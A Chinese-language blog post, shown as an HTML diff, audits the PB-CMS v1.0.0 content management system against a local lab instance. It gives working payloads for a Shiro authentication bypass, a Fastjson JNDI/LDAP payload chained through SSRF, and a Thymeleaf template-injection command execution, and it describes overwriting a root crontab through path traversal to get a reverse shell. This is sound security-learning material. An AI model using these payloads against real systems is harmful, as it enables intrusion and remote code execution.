@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Yu9">
+    
+    <title>
+        
+            PB-CMS代码审计 |
+        
+        Yu9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/blog/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/blog/images/logo.png">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/font/css/brands.min.css">
+    
+        
+            
+                
+<link rel="stylesheet" href="/blog/css/custom.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"wsyu9a.github.io","root":"/blog/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#999999","title":"Yu9's Blog","author":"Yu9","avatar":"/images/avatar.png","logo":"/images/logo.png","favicon":"/images/logo.png"},"menu":{"Home":"/","Archives":"/archives","Tags":"/tags","About":"/about"},"first_screen":{"enable":true,"background_img":"/images/bgc.png","background_img_dark":"/images/bgc.png","description":"Runtime.getRuntime().exec(\"变有钱\")","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/wsYu9a","weixin":"img | /images/wechat.jpg"}},"scroll":{"progress_bar":false,"percent":true,"hide_header":true},"home":{"category":false,"tag":true,"announcement":null},"post":{"author_badge":{"enable":false,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD","copyright_info":false,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2023,"word_count":true,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":true,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":true,"css":["/css/custom.css"]},"root":"/blog","source_data":{},"version":"4.1.0"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/blog/">
+                    <img src="/blog/images/logo.png">
+                </a>
+            
+            <a class="site-name border-box" href="/blog/">
+               Yu9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/blog/"
+                            >
+                                
+                                首页
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/blog/archives"
+                            >
+                                
+                                归档
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/blog/tags"
+                            >
+                                
+                                标签
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/blog/about"
+                            >
+                                
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/blog/"
+                    >首页</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/blog/archives"
+                    >归档</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/blog/tags"
+                    >标签</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/blog/about"
+                    >关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        PB-CMS代码审计
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/blog/images/avatar.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Yu9</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2024-03-05</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Tue Mar 19 2024 02:59:46 GMT+0000">2024-03-19</span>
+            </span>
+        
+
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/blog/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.8k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>6 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <p><strong>文章首发先知社区</strong></p>
+<p><strong>链接：<a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13867" >https://xz.aliyun.com/t/13867<i class="fas fa-external-link-alt"></i></a></strong></p>
+<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本次审计的系统是PB-CMS（瀑布内容管理系统），涉及到的技术栈有SpringBoot、Apache Shiro、Mybatis Plus 、Thymeleaf 等等，在它的 v1.0.0版本中存在一些经典的漏洞，<code>Yu9</code>相信刚开始学习java代码审计的师傅通过审计该cms可以收获不少知识。</p>
+<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>项目地址：<a class="link"   target="_blank" rel="noopener" href="https://gitee.com/LinZhaoguan/pb-cms/tree/v1.0.0/" >https://gitee.com/LinZhaoguan/pb-cms/tree/v1.0.0/<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x03-声明"><a href="#0x03-声明" class="headerlink" title="0x03 声明"></a>0x03 声明</h2><p>此分享主要用于交流学习，请勿用于非法用途，否则一切后果自付。</p>
+<h2 id="0x04-shiro反序列化漏洞"><a href="#0x04-shiro反序列化漏洞" class="headerlink" title="0x04 shiro反序列化漏洞"></a>0x04 shiro反序列化漏洞</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在pom.xml文件中可以看到shiro的版本是<code>1.4.1</code>是存在反序列化漏洞的</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d64825d2a62.png"  alt="image-20240222025948750"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>拿出我们的shiro一把梭工具，工具下载地址：<a class="link"   target="_blank" rel="noopener" href="https://github.com/j1anFen/shiro_attack" >https://github.com/j1anFen/shiro_attack<i class="fas fa-external-link-alt"></i></a></p>
+<p>爆秘钥以及利用链</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d648a9aed3a.png"  alt="image-20240222030201116"></p>
+<p>执行命令</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d648bec8b9c.png"  alt="image-20240222030222079"></p>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>最开始看到shiro的版本是1.4.1最先想到的就是shiro720，因为shiro550的利用版本要 &lt; 1.2.4。</p>
+<p>但是在在Shiro反序列化漏洞修复的过程中，如果仅进行Shiro的版本升级，而没有重新生成密钥，那么AES加密的默认密钥扔硬编码在代码里，仍然会存在反序列化风险。</p>
+<p>所以猜测该cms对cookie加密仍然使用的是<code>硬编码</code></p>
+<p>在看了shiro的配置文件之后，发现确实如此！</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d64cff1f60e.png"  alt="image-20240222032030472"></p>
+<h2 id="0x05-shiro权限绕过"><a href="#0x05-shiro权限绕过" class="headerlink" title="0x05 shiro权限绕过"></a>0x05 shiro权限绕过</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>既然shiro的版本是<code>1.4.1</code>，那肯定也存在权限绕过漏洞。</p>
+<p>例如：CVE-2020-11989</p>
+<p>Apache Shiro 1.5.3之前的版本中，当将Apache Shiro与Spring动态控制器一起使用时，精心编制的请求可能会导致绕过身份验证。</p>
+<p>漏洞的主要原因就是shiro和spring对路径的解析有差异！</p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>直接访问<code>/cms/admin</code>，会跳转让我们先登录</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d651b29f19a.png"  alt="image-20240222034033903"></p>
+<p>使用<code>/;/cms/admin</code>绕过</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d651eeba3e3.png"  alt="image-20240222034133724"></p>
+<h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3><p><strong>1）shiro</strong></p>
+<p>把断点下在<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain()</code></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d65722ec3c8.png"  alt="image-20240222040346140"></p>
+<p>通过<code>this.getPathWithinApplication(request)</code>来获取uri。</p>
+<p>一直alt+shift+f7，我们可以跟进到<code>org.apache.shiro.web.util.WebUtils#getPathWithinApplication</code></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d658011181c.png"  alt="image-20240222040728346"></p>
+<p>具体获取uri的逻辑就在<code>getRequestUri(request)</code>中，跟进之后会发现，在返回uri前通过<code>decodeAndCleanUriString</code>方法做了一些处理</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d6585f954af.png"  alt="image-20240222040902722"></p>
+<p>这段代码的作用是对 URI 进行处理，截取第一个分号之前的部分并返回</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d658b3a68c0.png"  alt="image-20240222041026919"></p>
+<p>所以最终我们获取到的就是<code>/</code></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d6590e5af1e.png"  alt="image-20240222041157686"></p>
+<p>最终和shiro过滤器中的<code>&quot;/&quot;, &quot;anon&quot;</code>匹配</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d65ab97fc9a.png"  alt="image-20240222041904806"></p>
+<p><strong>2）spring</strong></p>
+<p>断点下载<code>org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping</code></p>
+<p>通过<code>getPathWithinApplication</code>来获取uri</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d65cc602b87.png"  alt="image-20240222042749239"></p>
+<p>跟进之后跟shiro的分析过程类似，跟进之后可以看到<code>this.getRequestUri(request)</code>中实现了获取uri的具体逻辑</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d65dfded31c.png"  alt="image-20240222043301257"></p>
+<p>继续跟进，可以看到返回前使用<code>decodeAndCleanUriString</code>方法做了处理</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d65e732b6a6.png"  alt="image-20240222043458879"></p>
+<p>跟进，第一步过滤了<code>;</code>，第二部过滤了重复的<code>/</code>，最终得到<code>/cms/admin/</code></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d65e956f384.png"  alt="image-20240222043533131"></p>
+<p><strong>3）总结</strong></p>
+<p>shiro对<code>/;/cms/admin/</code>处理后得到<code>/</code>绕过了权限认证</p>
+<p>spring对<code>/;/cms/admin/</code>处理后得到<code>/cms/admin/</code>正常访问</p>
+<h2 id="0x06-Ssrf结合Fastjson"><a href="#0x06-Ssrf结合Fastjson" class="headerlink" title="0x06 Ssrf结合Fastjson"></a>0x06 Ssrf结合Fastjson</h2><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>作者可能是不小心多打了一个点，导致管理员少了一个权限。</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d660811fbe4.png"  alt="image-20240222044344758"></p>
+<p>到数据库中把这个点删了，然后重启，重新登录。之后再看<code>文章列表</code>就会发现多了一个批量推送的功能！</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d667f7b8aef.png"  alt="image-20240222051535308"></p>
+<p>这个漏洞是通过自动化工具扫出来的，不然还真发现不了。</p>
+<p>就是Ssrf，但只支持http协议，并且无回显</p>
+<p>不过后貌似可以结合fastjson打一下。</p>
+<p>fastjson版本是1.2.66，并且存在shiro-core依赖，所以有机会利用一下</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d67ed0eb357.png"  alt="image-20240222065303889"></p>
+<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><strong>1）ssrf</strong></p>
+<p>首先使用yakit的dnslog生成一个域名</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d669253c399.png"  alt="image-20240222052036906"></p>
+<p>到网站管理 -&gt; 基础信息出，替换百度推送地址</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d6694035ff8.png"  alt="image-20240222052103830"></p>
+<p>然后到文章列表处点批量推送</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d669a650510.png"  alt="image-20240222052245922"></p>
+<p>成功触发</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d6698e7fddc.png"  alt="image-20240222052222177"></p>
+<p><strong>2）fastjson</strong></p>
+<p>怎么说呢，它这环境中fastjson是利用不了的。因为在fastjson1.2.66环境下，autotypesupport属性为true才可使用，但在1.2.25版本以后该属性默认为false</p>
+<p>为了掩饰一下组合漏洞的效果，咱把<code>autotypesupport</code>设置为true</p>
+<p>把<code>com.puboot.module.admin.controller.ArticleController#pushBatch</code>修改一下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">baiduPushResVo</span> <span class="operator">=</span> JSON.parseObject(PushArticleUtil.postBaidu(url, urls));</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span>==<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d68471e5e72.png"  alt="image-20240222071705059"></p>
+<p>还有一个地方要改一下，不然会报错！</p>
+<p>在<code>com.puboot.common.util.PushArticleUtil#postBaidu</code>。这中间一些写入的代码删掉，感觉是作者设计的问题！</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d680da43c11.png"  alt="image-20240222070145506"></p>
+<p>业务逻辑应该是要<em>允许写入输出</em>，但作者并没有设置。所以会报错</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d681a832c6e.png"  alt="image-20240222070511289"></p>
+<p>先删掉好了</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d680a56fd0c.png"  alt="image-20240222070052615"></p>
+<p>现在环境就OK了，我们使用yakit起一个<code>ldap</code>服务</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d681e5cf1e8.png"  alt="image-20240222070612957"></p>
+<p>接着vps起一个web服务返回payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;, &quot;jndiNames&quot;:[&quot;ldap://127.0.0.1:8085/uRKFmZXL&quot;], &quot;Realms&quot;:[&quot;&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以用python，我是直接用的宝塔</p>
+<p>接着就百度推送地址改成我们vps地址就ok</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d682900423f.png"  alt="image-20240222070903150"></p>
+<p>点击推送，弹出计算机</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d684af309fd.png"  alt="image-20240222071806121"></p>
+<p>总的来说呢，fastjson是利用不了的。但觉得ssrf+fastjson挺有意思就改了一下</p>
+<h3 id="代码审计-2"><a href="#代码审计-2" class="headerlink" title="代码审计"></a>代码审计</h3><p>在<code>com.puboot.module.admin.controller.ArticleController#pushBatch</code>，下突出下个断点，点击推送</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d6850b359c8.png"  alt="image-20240222071938383"></p>
+<p>可以看到先和我们之前设置的百度推送地址建立连接</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d6857b4561d.png"  alt="image-20240222072130313"></p>
+<p>中间有一块应该是推送的代码，就之前删除那部分（说实话没太理解），然后就是获取响应的内容返回</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d685d561dfb.png"  alt="image-20240222072300455"></p>
+<p>之后就触发fastjson漏洞</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d6864e2742b.png"  alt="image-20240222072501342"></p>
+<h2 id="0x07-Thymeleaf模板注入漏洞"><a href="#0x07-Thymeleaf模板注入漏洞" class="headerlink" title="0x07 Thymeleaf模板注入漏洞"></a>0x07 Thymeleaf模板注入漏洞</h2><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>能引起Thymeleaf模板注入漏洞的就两种情况：</p>
+<p>1）在查找模板中，引用了用户输入的内容</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/path&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">path</span><span class="params">(<span class="meta">@RequestParam</span> String lang)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span>  lang ; <span class="comment">//template path is tainted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2）controller无返回值，则以GetMapping的路由为视图名称</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getDocument</span><span class="params">(<span class="meta">@PathVariable</span> String document)</span> &#123;</span><br><span class="line">    log.info(<span class="string">&quot;Retrieving &quot;</span> + document);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以我们在寻找Thymeleaf模板注入漏洞时，重点关注一下以上两种情况，看看有没有查找模版时<code>视图名称</code>用户可控</p>
+<h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在主题管理功能处新增主题，然后在主题名称填入我们的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__$&#123;T(Runtime).getRuntime().exec(&quot;calc&quot;)&#125;__::.x</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d768450f83d.png"  alt="image-20240222232907295"></p>
+<p>之后我们点启用</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d7687f8e72f.png"  alt="image-20240222233006215"></p>
+<p>访问网站首页即可触发：<a class="link"   target="_blank" rel="noopener" href="http://localhost:8080/cms/" >http://localhost:8080/cms/<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d76d48dcdb5.gif" ></p>
+<h3 id="代码审计-3"><a href="#代码审计-3" class="headerlink" title="代码审计"></a>代码审计</h3><p>可以看到，在访问网站首页时，通过<code>bizThemeService.selectCurrent().getName()</code>可以获取到我们之前设置的主题的名称</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/22/65d76ec875d5b.png"  alt="image-20240222235655047"></p>
+<h2 id="0x08-后话"><a href="#0x08-后话" class="headerlink" title="0x08 后话"></a>0x08 后话</h2><p>这块其实还有一个文件上传的漏洞，详情可以看看这位师傅提的：<a class="link"   target="_blank" rel="noopener" href="https://gitee.com/LinZhaoguan/pb-cms/issues/I8T4WR" >https://gitee.com/LinZhaoguan/pb-cms/issues/I8T4WR<i class="fas fa-external-link-alt"></i></a></p>
+<p>它未过滤后缀并且可以目录遍历，本来是想着覆盖计划任务反弹shell，但是深入后发现，作者在对上传文件进行了一些处理，结合时间戳重新对文件进行了命名。</p>
+<p>逻辑就是以最后一个点为分割，在中间拼接当前时间戳！若上传文件<code>as.exe</code>，处理后就是<code>as_1708639915916.exe</code></p>
+<p>在覆盖计划任务，抓包后修改文件名为<code>../../var/spool/cron/root</code>，最终得路径就是<code>\自己设置的存图片路径\20240223\../._1708639915916../../var/spool/cron/root</code></p>
+<p>这就导致不能覆盖计划任务了，如何有师傅有绕过思路，一块交流交流！</p>
+
+                </div>
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/blog/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/blog/2024/03/17/240317%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%88%86%E6%9E%90/"
+                                   title="若依定时任务分析"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">若依定时任务分析</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/blog/2024/03/02/240302CVE-2023-46604-ApacheActiveMQ-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"
+                                   title="CVE-2023-46604 Apache ActiveMQ RCE 漏洞分析"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">CVE-2023-46604 Apache ActiveMQ RCE 漏洞分析</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">0x02 环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%A3%B0%E6%98%8E"><span class="nav-text">0x03 声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">0x04 shiro反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">代码审计</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87"><span class="nav-text">0x05 shiro权限绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a 